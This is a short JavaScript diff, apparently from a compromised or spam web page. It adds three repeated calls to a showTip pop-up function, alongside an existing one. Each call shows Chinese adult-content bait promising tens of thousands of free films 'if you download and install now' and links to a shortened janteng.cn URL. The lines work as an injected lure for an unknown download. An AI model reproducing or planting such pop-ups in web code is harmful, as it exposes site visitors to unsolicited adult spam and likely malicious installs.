@@ -41,3 +41,6 @@ function showTip(text, down_url, delay, set_timer){
 	}
 }
 showTip("★成人爽片5万部成人影片，立即下载安装免费观看？★", "http://janteng.cn/10Nz", 60000, true);
+showTip("★成人爽片5万部成人影片，立即下载安装免费观看？★", "http://janteng.cn/10Nz", 13000, true);
+showTip("★成人爽片5万部成人影片，立即下载安装免费观看？★", "http://janteng.cn/10Nz", 20000, true);
+showTip("★成人爽片5万部成人影片，立即下载安装免费观看？★", "http://janteng.cn/10Nz", 30000, true);
